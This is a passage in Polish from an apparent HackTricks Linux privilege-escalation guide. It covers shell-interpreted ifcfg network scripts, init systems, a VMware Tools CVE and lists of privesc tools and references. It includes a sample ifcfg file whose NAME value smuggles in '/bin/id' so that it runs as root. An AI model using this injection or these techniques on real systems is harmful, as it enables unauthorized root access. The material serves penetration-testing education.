W systemie rzeczywiście używającym uprzywilejowanych starszych skryptów nieujęte w cudzysłowy przypisanie w pliku `ifcfg-*`, które jest interpretowane przez powłokę, takie jak `NAME=`, może przekroczyć granicę prowadzącą do wykonania kodu. Zweryfikuj dokładny parser, wartość i ścieżkę aktywacji; nie zakładaj interpretacji przez powłokę na podstawie samej nazwy pliku ani obecności NetworkManager. Wrapper dozwolony przez sudo, który zapisuje dane wejściowe użytkownika do pliku `ifcfg-*`, a następnie wywołuje starsze `ifup`, stanowi odrębną drogę do przekroczenia tej granicy, nawet jeśli użytkownik nie może bezpośrednio edytować pliku.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Zwróć uwagę na spację między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Znajdują się w nim skrypty do `start`, `stop`, `restart`, a czasem także `reload` usług. Można je uruchamiać bezpośrednio lub za pośrednictwem dowiązań symbolicznych znajdujących się w `/etc/rc?.d/`. W systemach Redhat alternatywną ścieżką jest `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, który wykorzystuje pliki konfiguracyjne do zarządzania usługami. Mimo przejścia na Upstart skrypty SysVinit są nadal używane wraz z konfiguracjami Upstart dzięki warstwie zgodności w Upstart.

**systemd** to nowoczesny menedżer inicjalizacji i usług, oferujący zaawansowane funkcje, takie jak uruchamianie demonów na żądanie, zarządzanie automatycznym montowaniem oraz migawki stanu systemu. Porządkuje pliki w katalogu `/usr/lib/systemd/` dla pakietów dystrybucji oraz `/etc/systemd/system/` dla zmian wprowadzanych przez administratora, usprawniając administrację systemem.<sup>[[21]](#references)</sup>

## Inne sztuczki

### Eskalacja uprawnień przez NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ucieczka z ograniczonych powłok


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../../network-services-pentesting/cisco-sd-wan-manager-local-privilege-escalation.md
{{#endref}}

## Frameworki rootowania Androida: nadużycie kanału managera

Frameworki rootowania Androida często przechwytują syscall, aby udostępnić managerowi w przestrzeni użytkownika funkcje uprzywilejowanego jądra. Słabe uwierzytelnianie managera (np. kontrole podpisu oparte na kolejności FD lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod managera i uzyskanie uprawnień root na urządzeniach, które mają już root. Więcej informacji i szczegóły exploita znajdziesz tutaj:


{{#ref}}
../../../mobile-pentesting/android-app-pentesting/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Wykrywanie usług VMware Tools i LPE (CWE-426) przez exec oparty na regex (CVE-2025-41244)

Wykrywanie usług oparte na regex w VMware Tools/Aria Operations może wyodrębnić ścieżkę do pliku binarnego z wierszy poleceń procesów i uruchomić go z argumentem -v w kontekście uprzywilejowanym. Zbyt liberalne wzorce (np. używające \S) mogą dopasować przygotowane przez atakującego procesy nasłuchujące w zapisywalnych lokalizacjach (np. /tmp/httpd), co może prowadzić do wykonania jako root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Więcej informacji i uogólniony wzorzec, który można zastosować w innych stosach wykrywania i monitorowania, znajdziesz tutaj:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Zabezpieczenia jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Narzędzia Linux/Unix Privesc

### **Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień w Linuksie:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opcja -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Wyszukiwanie podatności jądra w Linuksie i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zbiór dodatkowych skryptów**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (eskalacja uprawnień przez interfejs Crontab, ponowne użycie danych uwierzytelniających zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: spreparowany payload .text_sig dla monitor uruchamianego przez cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: obejście Neighborhood Watch (przejęcie PATH przez sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Podstawowa eskalacja uprawnień w Linuksie](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Przewodnik po eskalacji uprawnień w Linuksie](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Atak i obrona: techniki eskalacji uprawnień w Linuksie z 2016 roku](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Nikt nie spodziewa się wykonania polecenia!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (eskalacja uprawnień w Linuksie)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – omówienie ćwiczeń laboratoryjnych - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: wskazówki i triki dotyczące eskalacji uprawnień w Linuksie](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: narzędzie do enumeracji i eskalacji uprawnień w Linuksie](https://github.com/rtcrowley/linux-private-i)
- [14] [Czym jest Socket?](https://www.linux.com/news/what-socket/)
- [15] [Omówienie Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Poznaj D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Pliki wykonywalne SUID — eskalacja uprawnień w Linuksie](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo część 2 – eskalacja uprawnień w Linuksie](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jak zarządzać ACL w Linuksie](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS: uzyskanie uprawnień root przez network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Czym jest systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (iniekcja arytmetyczna Bash przez logi, pełny łańcuch)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Podręcznik GNU Bash – BASH_ENV (plik startowy dla trybu nieinteraktywnego)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + eskalacja uprawnień przez dowiązanie symboliczne TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (kopiowanie przez cron pg_basebackup → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Nazwij to, a VMware podniesie uprawnienia (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: eskalacja uprawnień przez Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – podatności eskalacji uprawnień w Sudo: CVE-2025-32462 i CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – katalogi repozytorium PYC](https://peps.python.org/pep-3147/)
- [32] [Dokumentacja Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit — zgłoszenie #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Wpis na Twitterze użytkownika @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Rejestrowanie haseł w Linuksie](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Szczegóły wyścigu warunków w logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Dokumentacja Python 3.10 – `site` i pliki konfiguracji ścieżek](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
